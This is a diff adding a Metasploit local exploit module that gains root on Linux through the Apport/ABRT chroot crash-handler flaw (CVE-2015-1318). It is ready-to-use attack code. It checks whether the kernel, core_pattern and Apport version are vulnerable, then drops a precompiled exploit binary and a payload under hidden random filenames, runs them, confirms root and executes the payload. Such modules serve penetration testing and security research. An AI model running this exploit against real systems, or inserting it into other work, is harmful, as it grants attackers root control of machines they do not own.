@@ -1,0 +1,185 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Apport / ABRT chroot Privilege Escalation',
+      'Description'    => %q{
+        This module attempts to gain root privileges on Linux systems by
+        invoking the default coredump handler inside a namespace ("container").
+
+        Apport versions 2.13 through 2.17.x before 2.17.1 on Ubuntu are
+        vulnerable, due to a feature which allows forwarding reports to
+        a container's Apport by changing the root directory before loading
+        the crash report, causing 'usr/share/apport/apport' within the crashed
+        task's directory to be executed.
+
+        Similarly, Fedora is vulnerable when the kernel crash handler is
+        configured to change root directory before executing ABRT, causing
+        'usr/libexec/abrt-hook-ccpp' within the crashed task's directory to be
+        executed.
+
+        In both instances, the crash handler does not drop privileges,
+        resulting in code execution as root.
+
+        This module has been tested successfully on Apport 2.14.1 on
+        Ubuntu 14.04.1 LTS x86 and x86_64 and ABRT on Fedora 19 and 20 x86_64.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Stéphane Graber', # Independent discovery, PoC and patch
+          'Tavis Ormandy', # Independent discovery and C exploit
+          'Ricardo F. Teixeira', # shell exploit
+          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
+        ],
+      'DisclosureDate' => 'Mar 31 2015',
+      'Platform'       => [ 'linux' ],
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'SessionTypes'   => [ 'shell', 'meterpreter' ],
+      'Targets'        => [[ 'Auto', {} ]],
+      'References'     =>
+        [
+          [ 'CVE', '2015-1318' ],
+          [ 'URL', 'http://www.openwall.com/lists/oss-security/2015/04/14/4' ],
+          # Exploits
+          [ 'EDB', '36782' ],
+          [ 'EDB', '36746' ],
+          [ 'URL', 'https://gist.github.com/taviso/0f02c255c13c5c113406' ],
+          # ABRT (Fedora)
+          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1211223' ],
+          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1211835' ],
+          # Apport (Ubuntu)
+          [ 'URL', 'https://usn.ubuntu.com/usn/USN-2569-1/' ],
+          [ 'URL', 'https://code.launchpad.net/~stgraber/apport/pidns-support/+merge/200893' ],
+          [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1438758' ],
+          [ 'URL', 'http://bazaar.launchpad.net/~apport-hackers/apport/trunk/revision/2943' ]
+        ]
+    ))
+    register_options(
+      [
+        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
+      ])
+  end
+
+  def base_dir
+    datastore['WritableDir']
+  end
+
+  def check
+    kernel_version = Gem::Version.new cmd_exec('uname -r').split('-').first
+
+    if kernel_version < Gem::Version.new('3.12')
+      vprint_error "Linux kernel version #{kernel_version} is NOT vulnerable"
+      return CheckCode::Safe
+    end
+
+    vprint_good "Linux kernel version #{kernel_version} is vulnerable"
+
+    kernel_core_pattern = cmd_exec 'cat /proc/sys/kernel/core_pattern'
+
+    # Vulnerable core_pattern (abrt):
+    #   kernel.core_pattern = |/usr/sbin/chroot /proc/%P/root /usr/libexec/abrt-hook-ccpp %s %c %p %u %g %t e
+    # Patched systems no longer preface the command with /usr/sbin/chroot
+    #   kernel.core_pattern = |/usr/libexec/abrt-hook-ccpp %s %c %p %u %g %t e
+    if kernel_core_pattern.include?('chroot') && kernel_core_pattern.include?('abrt-hook-ccpp')
+      vprint_good 'System is configured to chroot ABRT for crash reporting'
+      return CheckCode::Vulnerable
+    end
+
+    # Vulnerable core_pattern (apport):
+    #   kernel.core_pattern = |/usr/share/apport/apport %p %s %c %P
+    if kernel_core_pattern.include? 'apport'
+      vprint_good 'System is configured to use Apport for crash reporting'
+
+      res = cmd_exec 'apport-cli --version'
+
+      if res.blank?
+        vprint_error 'Apport is NOT installed'
+        return CheckCode::Safe
+      end
+
+      apport_version = Gem::Version.new(res.split('-').first)
+
+      if apport_version >= Gem::Version.new('2.13') && apport_version < Gem::Version.new('2.17.1')
+        vprint_good "Apport version #{apport_version} is vulnerable"
+        return CheckCode::Vulnerable
+      end
+
+      vprint_error "Apport version #{apport_version} is NOT vulnerable"
+
+      return CheckCode::Safe
+    end
+
+    vprint_error 'System is NOT configured to use Apport or chroot ABRT for crash reporting'
+
+    CheckCode::Safe
+  end
+
+  def upload_and_chmodx(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    rm_f path
+    write_file path, data
+    cmd_exec "chmod +x '#{path}'"
+    register_file_for_cleanup path
+  end
+
+  def exploit
+    if check != CheckCode::Vulnerable
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+    end
+
+    # Upload Tavis Ormandy's newpid exploit:
+    # - https://www.exploit-db.com/exploits/36746/
+    # Cross-compiled with:
+    # - i486-linux-musl-cc -static newpid.c
+    path = ::File.join Msf::Config.data_directory, 'exploits', 'cve-2015-1318', 'newpid'
+    fd = ::File.open path, 'rb'
+    executable_data = fd.read fd.stat.size
+    fd.close
+
+    executable_name = ".#{rand_text_alphanumeric rand(5..10)}"
+    executable_path = "#{base_dir}/#{executable_name}"
+    upload_and_chmodx executable_path, executable_data
+
+    # Upload payload executable
+    payload_name = ".#{rand_text_alphanumeric rand(5..10)}"
+    payload_path = "#{base_dir}/#{payload_name}"
+    upload_and_chmodx payload_path, generate_payload_exe
+
+    # newpid writes an 'exploit' directory
+    # which must be removed manually if exploitation fails
+    register_dir_for_cleanup "#{base_dir}/exploit"
+
+    # Change working directory to base_dir,
+    # allowing newpid to create the required hard links
+    cmd_exec "cd '#{base_dir}'"
+
+    print_status 'Launching exploit...'
+    output = cmd_exec executable_path
+    output.each_line { |line| vprint_status line.chomp }
+
+    # Check for root privileges
+    id = cmd_exec 'id'
+
+    unless id.include? 'root'
+      fail_with Failure::Unknown, 'Failed to gain root privileges'
+    end
+
+    print_good 'Upgraded session to root privileges'
+    vprint_line id
+
+    # Execute payload executable
+    vprint_status 'Executing payload...'
+    cmd_exec payload_path
+  end
+end
